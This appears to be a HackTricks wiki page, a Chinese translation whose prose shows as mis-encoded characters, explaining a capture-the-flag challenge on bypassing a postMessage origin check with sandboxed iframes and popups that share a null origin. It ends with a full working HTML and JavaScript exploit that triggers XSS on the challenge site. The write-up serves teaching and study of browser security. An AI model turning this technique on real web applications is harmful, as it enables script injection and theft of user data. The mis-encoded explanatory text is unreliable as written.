# Bypassing SOP with Iframes - 1

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Iframes in SOP-1

åœ¨è¿™ä¸ªç”± [**NDevTK**](https://github.com/NDevTK) å’Œ [**Terjanq**](https://github.com/terjanq) åˆ›å»ºçš„ [**æŒ‘æˆ˜**](https://github.com/terjanq/same-origin-xss) ä¸­ï¼Œä½ éœ€è¦åˆ©ç”¨ç¼–ç ä¸­çš„ XSSã€‚
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
const data = e.data;
if (e.origin !== window.origin && data.identifier !== identifier) return;
if (data.type === 'render') {
renderContainer.innerHTML = data.body;
}
}
```
ä¸»è¦é—®é¢˜æ˜¯[**ä¸»é¡µé¢**](https://so-xss.terjanq.me)ä½¿ç”¨DomPurifyå‘é€`data.body`ï¼Œå› æ­¤ä¸ºäº†å°†è‡ªå·±çš„htmlæ•°æ®å‘é€åˆ°è¯¥ä»£ç ï¼Œæ‚¨éœ€è¦**ç»•è¿‡**`e.origin !== window.origin`ã€‚

è®©æˆ‘ä»¬çœ‹çœ‹ä»–ä»¬æå‡ºçš„è§£å†³æ–¹æ¡ˆã€‚

### SOPç»•è¿‡1 (e.origin === null)

å½“`//example.org`åµŒå…¥åˆ°ä¸€ä¸ª**æ²™ç›’iframe**ä¸­æ—¶ï¼Œé¡µé¢çš„**æº**å°†æ˜¯**`null`**ï¼Œå³**`window.origin === null`**ã€‚å› æ­¤ï¼Œä»…é€šè¿‡ä½¿ç”¨`<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`åµŒå…¥iframeï¼Œæˆ‘ä»¬å¯ä»¥**å¼ºåˆ¶`null`æº**ã€‚

å¦‚æœé¡µé¢æ˜¯**å¯åµŒå…¥çš„**ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡è¯¥ä¿æŠ¤ï¼ˆcookieså¯èƒ½ä¹Ÿéœ€è¦è®¾ç½®ä¸º`SameSite=None`ï¼‰ã€‚

### SOPç»•è¿‡2 (window.origin === null)

è¾ƒå°‘ä¸ºäººçŸ¥çš„äº‹å®æ˜¯ï¼Œå½“**æ²™ç›’å€¼`allow-popups`è¢«è®¾ç½®**æ—¶ï¼Œ**æ‰“å¼€çš„å¼¹å‡ºçª—å£**å°†**ç»§æ‰¿**æ‰€æœ‰**æ²™ç›’å±æ€§**ï¼Œé™¤éè®¾ç½®äº†`allow-popups-to-escape-sandbox`ã€‚\
å› æ­¤ï¼Œä»**nullæº**æ‰“å¼€**å¼¹å‡ºçª—å£**å°†ä½¿å¼¹å‡ºçª—å£å†…çš„**`window.origin`**ä¹Ÿä¸º**`null`**ã€‚

### æŒ‘æˆ˜è§£å†³æ–¹æ¡ˆ

å› æ­¤ï¼Œå¯¹äºè¿™ä¸ªæŒ‘æˆ˜ï¼Œå¯ä»¥**åˆ›å»º**ä¸€ä¸ª**iframe**ï¼Œ**æ‰“å¼€ä¸€ä¸ªå¼¹å‡ºçª—å£**åˆ°å…·æœ‰æ˜“å—æ”»å‡»çš„XSSä»£ç å¤„ç†ç¨‹åºçš„é¡µé¢(`/iframe.php`)ï¼Œå› ä¸º`window.origin === e.origin`å› ä¸ºä¸¤è€…éƒ½æ˜¯`null`ï¼Œæ‰€ä»¥å¯ä»¥**å‘é€ä¸€ä¸ªæœ‰æ•ˆè½½è·æ¥åˆ©ç”¨XSS**ã€‚

è¯¥**æœ‰æ•ˆè½½è·**å°†è·å–**æ ‡è¯†ç¬¦**å¹¶å°†**XSS**å‘é€**å›åˆ°ä¸»é¡µé¢**ï¼ˆæ‰“å¼€å¼¹å‡ºçª—å£çš„é¡µé¢ï¼‰ï¼Œ**è¿™å°†**ä½¿**ä½ç½®**æ›´æ”¹ä¸º**æ˜“å—æ”»å‡»çš„**`/iframe.php`ã€‚å› ä¸ºæ ‡è¯†ç¬¦æ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥ä¸ç®¡æ¡ä»¶`window.origin === e.origin`æ˜¯å¦æ»¡è¶³éƒ½æ— å…³ç´§è¦ï¼ˆè¯·è®°ä½ï¼Œæºæ˜¯æ¥è‡ªå…·æœ‰**æº**ä¸º**`null`**çš„iframeçš„**å¼¹å‡ºçª—å£**ï¼‰ï¼Œå› ä¸º`data.identifier === identifier`ã€‚ç„¶åï¼Œ**XSSå°†å†æ¬¡è§¦å‘**ï¼Œè¿™æ¬¡åœ¨æ­£ç¡®çš„æºä¸­ã€‚
```html
<body>
<script>
f = document.createElement('iframe');

// Needed flags
f.sandbox = 'allow-scripts allow-popups allow-top-navigation';

// Second communication with /iframe.php (this is the top page relocated)
// This will execute the alert in the correct origin
const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
},1000);`.replaceAll('\n',' ');

// Initial communication
// Open /iframe.php in a popup, both iframes and popup will have "null" as origin
// Then, bypass window.origin === e.origin to steal the identifier and communicate
// with the top with the second XSS payload
f.srcdoc = `
<h1>Click me!</h1>
<script>
onclick = e => {
let w = open('https://so-xss.terjanq.me/iframe.php');
onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
setTimeout(_ => {
w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
}, 1000);
};
<\/script>
`
document.body.appendChild(f);
</script>
</body>
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
